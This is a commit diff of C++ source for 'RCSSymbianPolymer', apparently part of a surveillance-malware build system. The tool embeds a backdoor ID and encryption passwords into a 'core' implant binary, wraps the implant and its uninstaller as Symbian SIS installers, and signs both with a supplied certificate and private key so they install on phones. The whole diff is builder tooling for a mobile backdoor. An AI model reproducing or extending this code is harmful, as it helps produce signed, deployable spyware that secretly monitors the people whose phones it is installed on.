First steps for the symbian packaging
git-svn-id: http://rcs-dev/svn/rcs/RCSBuilder@2114 30e694c7-159d-4bd8-ba75-215c342f8d20

+++ RCSSymbianPolymer/RCSSymbianPolymer.cpp
@@ -6,7 +6,8 @@
 #include "fileutils.h"
 
 bool FindMemMarker(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len);
-extern BOOL SignMobileComponent(TCHAR *wsFile, TCHAR *wsCert);
+extern BOOL SignSis(TCHAR *wsFile, TCHAR *wsCert, TCHAR *wsKey);
+extern BOOL CreateSis(UINT flag, TCHAR *wsFile);
 
 int _tmain(int argc, _TCHAR* argv[])
 {
@@ -16,21 +17,25 @@ int _tmain(int argc, _TCHAR* argv[])
 	CHAR szLogPassword[256];
 	CHAR szConfPassword[256];
 	CHAR szChanPassword[256];
-	WCHAR wsPFXFile[MAX_PATH];
-	WCHAR wsDllFile[MAX_PATH];
+	WCHAR wsCERFile[MAX_PATH];
+	WCHAR wsKEYFile[MAX_PATH];
+	WCHAR wsCoreFile[MAX_PATH];
+	WCHAR wsUnFile[MAX_PATH];
 	WCHAR wsOutFile[MAX_PATH];
 	unsigned int iLen = 0;
 
-	if (argc != 7) {
+	if (argc != 9) {
 		printf("ERROR: \n");
-		printf("  usage:  RCSSymbianPolymer.exe  <bid> <log_pass> <conf_pass> <chanpass> <cert> <core> <output>\n\n");
+		printf("  usage:  RCSSymbianPolymer.exe  <bid> <log_pass> <conf_pass> <chanpass> <cer> <key> <core> <uninstaller> <output>\n\n");
 		printf("  <bid> is the backdoor_id\n");
 		printf("  <log_pass> is the password for the log encryption\n");
 		printf("  <conf_pass> is the password for the conf encryption\n");
 		printf("  <chanpass> is the password for the channel encryption\n");
-		printf("  <cert> is the cert to sign the sysx\n");
+		printf("  <cer> is the certificate to sign the sysx\n");
+		printf("  <key> is the private key of the certificate\n");
 		printf("  <core> is the core to be polymerized\n");
-		printf("  <output> is the output file\n\n");
+		printf("  <uninstaller> is the core uninstaller\n");
+		//printf("  <output> is the output file\n\n");
 		return 0;
 	}
 
@@ -38,9 +43,11 @@ int _tmain(int argc, _TCHAR* argv[])
 	sprintf_s(szLogPassword, sizeof(szLogPassword), "%S", argv[2]);
 	sprintf_s(szConfPassword, sizeof(szConfPassword), "%S", argv[3]);
 	sprintf_s(szChanPassword, sizeof(szChanPassword), "%S", argv[4]);
-	wsprintf(wsPFXFile, L"%s", argv[5]);
-	wsprintf(wsDllFile, L"%s", argv[6]);
-	wsprintf(wsOutFile, L"%s", argv[7]);
+	wsprintf(wsCERFile, L"%s", argv[5]);
+	wsprintf(wsKEYFile, L"%s", argv[6]);
+	wsprintf(wsCoreFile, L"%s", argv[7]);
+	wsprintf(wsUnFile, L"%s", argv[8]);
+	//wsprintf(wsOutFile, L"%s", argv[9]);
 
 	/************************************************************************/
 	/*  SANITY CHECKS                                                       */
@@ -65,15 +72,17 @@ int _tmain(int argc, _TCHAR* argv[])
 		return ERROR_EMBEDDING;
 	}
 
-	if ( (hFile = CreateFile(wsPFXFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
-		printf("Cannot find FPX file [%S]\n", wsPFXFile);
+	if ( (hFile = CreateFile(wsCERFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
+		printf("Cannot find CER file [%S]\n", wsCERFile);
 		return ERROR_EMBEDDING;
 	} else {
-		DWORD len = GetFileSize(hFile, NULL);
-		//if (len < PEM_KEY_LEN) {
-		//	printf("Bad certificate file len [%S]\n", wsCertFile);
-		//	return ERROR_EMBEDDING;
-		//}
+		CloseHandle(hFile);
+	}
+
+	if ( (hFile = CreateFile(wsKEYFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
+		printf("Cannot find KEY file [%S]\n", wsKEYFile);
+		return ERROR_EMBEDDING;
+	} else {
 		CloseHandle(hFile);
 	}
 
@@ -86,13 +95,35 @@ int _tmain(int argc, _TCHAR* argv[])
 	printf("LOG PASSWORD  [%s]\n", szLogPassword);
 	printf("CONF PASSWORD [%s]\n", szConfPassword);
 	printf("CHAN PASSWORD [%s]\n", szChanPassword);
-	printf("PFXFILE       [%S]\n", wsPFXFile);
-	printf("INPUT DLL     [%S]\n", wsDllFile);
-	printf("OUTPUT DLL    [%S]\n\n", wsOutFile);
+	printf("CERFILE       [%S]\n", wsCERFile);
+	printf("KEYFILE       [%S]\n", wsKEYFile);
+	printf("INPUT CORE    [%S]\n", wsCoreFile);
+	printf("UNINSTALLER   [%S]\n", wsUnFile);
+	//printf("OUTPUT FILE   [%S]\n\n", wsOutFile);
 
-	if (CopyFile(wsDllFile, wsOutFile, FALSE) == FALSE) {
-		printf("Cannot create output file[%S]\n", wsOutFile);
-		return ERROR_OUTPUT;
+
+	/************************************************************************/
+	/* UNINSTALLER SIS CREATION                                             */
+	/************************************************************************/
+
+	if (CreateSis(SIS_UNINST, wsUnFile))
+		printf("Creating uninstaller sis file... ok\n");
+	else {
+		printf("Cannot create uninstaller sis file [%S]\n", wsUnFile);
+		return ERROR_EMBEDDING;
+	}
+
+	/************************************************************************/
+	/* SIGNING THE UNINSTALLER                                              */
+	/************************************************************************/
+
+
+	if (SignSis(wsUnFile, wsCERFile, wsKEYFile))
+		printf("Using the certificate to sign the uninstaller... ok\n");
+	else {
+		printf("Cannot sign with the certificate file [%S][%S]\n", wsCERFile, wsKEYFile);
+		DeleteFile(wsOutFile);
+		return ERROR_EMBEDDING;
 	}
 
 	/************************************************************************/
@@ -101,7 +132,7 @@ int _tmain(int argc, _TCHAR* argv[])
 
 	BYTE bufmd5[MD5_DIGEST_LENGTH];
 
-	pBlockPtr = (BYTE *) LoadFile(wsOutFile, &iLen);
+	pBlockPtr = (BYTE *) LoadFile(wsCoreFile, &iLen);
 
 	// Patching Passwod dei log
 	MD5((const UCHAR *)szLogPassword, strlen(szLogPassword) , (PUCHAR) bufmd5);
@@ -109,7 +140,6 @@ int _tmain(int argc, _TCHAR* argv[])
 		printf("Password embedded... ok\n");
 	else {
 		printf("Cannot embed Log Password [%S]\n", wsOutFile);
-		DeleteFile(wsOutFile);
 		return ERROR_EMBEDDING;
 	}
 
@@ -119,7 +149,6 @@ int _tmain(int argc, _TCHAR* argv[])
 		printf("Password embedded... ok\n");
 	else {
 		printf("Cannot embed Conf Password [%S]\n", wsOutFile);
-		DeleteFile(wsOutFile);
 		return ERROR_EMBEDDING;
 	}
 
@@ -129,7 +158,6 @@ int _tmain(int argc, _TCHAR* argv[])
 		printf("Channel Password embedded... ok\n");
 	else {
 		printf("Cannot embed Channel Password [%S]\n", wsOutFile);
-		DeleteFile(wsOutFile);
 		return ERROR_EMBEDDING;
 	}
 
@@ -138,7 +166,6 @@ int _tmain(int argc, _TCHAR* argv[])
 		printf("Backdoor_id embedded... ok\n");
 	else {
 		printf("Cannot embed Backdoor_id [%S]\n", wsOutFile);
-		DeleteFile(wsOutFile);
 		return ERROR_EMBEDDING;
 	}
 
@@ -147,21 +174,32 @@ int _tmain(int argc, _TCHAR* argv[])
 		printf("Config name embedded... ok\n");
 	else {
 		printf("Cannot embed Config Name [%S]\n", wsOutFile);
-		DeleteFile(wsOutFile);
 		return ERROR_EMBEDDING;
 	}
 
 	UnloadFile(pBlockPtr);
 
 	/************************************************************************/
+	/* FINAL SIS CREATION                                                   */
+	/************************************************************************/
+
+	if (CreateSis(SIS_CORE, wsCoreFile))
+		printf("Creating sis file... ok\n");
+	else {
+		printf("Cannot create sis file [%S]\n", wsCoreFile);
+		DeleteFile(wsOutFile);
+		return ERROR_EMBEDDING;
+	}
+
+	/************************************************************************/
 	/* SIGNING                                                              */
 	/************************************************************************/
 
 
-	if (SignMobileComponent(wsOutFile, wsPFXFile))
-		printf("Using PFX to sign code... ok\n");
+	if (SignSis(wsCoreFile, wsCERFile, wsKEYFile))
+		printf("Using the certificate to sign the code... ok\n");
 	else {
-		printf("Cannot sign with PFX file [%S]\n", wsPFXFile);
+		printf("Cannot sign with the certificate file [%S][%S]\n", wsCERFile, wsKEYFile);
 		DeleteFile(wsOutFile);
 		return ERROR_EMBEDDING;
 	}
